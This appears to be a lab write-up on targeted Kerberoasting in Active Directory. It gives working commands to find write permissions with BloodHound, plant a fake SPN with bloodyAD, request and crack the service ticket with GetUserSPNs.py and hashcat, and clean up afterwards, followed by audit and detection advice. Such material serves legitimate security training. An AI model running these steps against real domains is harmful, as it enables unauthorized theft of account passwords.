Targeted Kerberoasting

A technique note from the Hack Smarter Shadowgate Active Directory lab. When you control an account that can write to another account, you can hand that account a service name, ask the domain for its ticket, and crack it offline.

This is a focused look at one technique from Shadowgate, not a full walkthrough of the box. Credentials and cracked values are redacted.

The Idea

Ordinary Kerberoasting targets accounts that already have a Service Principal Name (SPN): any domain user can request a service ticket (TGS) for them, and that ticket is encrypted with the service account's password hash — so it can be cracked offline.

Targeted Kerberoasting removes the precondition. If you control a principal that has write permission over another user (an ACL such as GenericWrite, GenericAll, or write to the servicePrincipalName property), you can give that victim an SPN yourself, roast them, crack the ticket, and then remove the SPN to clean up. It turns an abusable permission into the victim's plaintext password.

1. Find the Write Edge

On Shadowgate, an owned account holds write access over a second user. Collect the domain with BloodHound and look for an outbound GenericWrite / WriteProperty edge from your account to another user — that is the signal this attack is possible.

nxc ldap DC -d DOMAIN -u OWNED_USER -p PASS --bloodhound --collection All
# in BloodHound: mark OWNED_USER as owned, then
# "Reachable High Value Targets" / outbound control edges

2. Set an SPN on the Victim

Use the write permission to add an arbitrary SPN to the victim account. BloodyAD does this over LDAP:

bloodyAD --host DC -d DOMAIN -u OWNED_USER -p PASS \
  set object VICTIM servicePrincipalName -v 'fake/spn.DOMAIN'
# [+] VICTIM's servicePrincipalName has been updated

The value only has to be well-formed; it does not need to point at a real service.

3. Roast and Crack

Now the victim has an SPN, request its service ticket and crack the returned hash offline. The hash is a Kerberos 5 TGS-REP (etype 23 → hashcat mode 13100).

GetUserSPNs.py DOMAIN/OWNED_USER:PASS -dc-ip DC -request-user VICTIM
#   (or: nxc ldap DC -u OWNED_USER -p PASS --kerberoasting out.txt)

hashcat -m 13100 victim_tgs.txt /usr/share/wordlists/rockyou.txt
#   Status: Cracked  ->  VICTIM's plaintext password

If the account's password is weak, it falls in seconds — and you now have the victim's real credentials to continue with.

4. Clean Up

On a real engagement, remove the SPN you added so you leave the account as you found it.

bloodyAD --host DC -d DOMAIN -u OWNED_USER -p PASS \
  set object VICTIM servicePrincipalName -v ''

What To Take Away

  • Write access over a user object is not harmless — it is enough to steal that user's password. Audit GenericWrite / GenericAll ACLs with BloodHound.
  • Any account with an SPN is roastable by any domain user. Give service accounts long, random, managed passwords (gMSA).
  • Watch for SPNs appearing on normal user accounts — a sudden servicePrincipalName change is a strong detection signal.
  • Only run this where you are authorized, and restore any attribute you change.
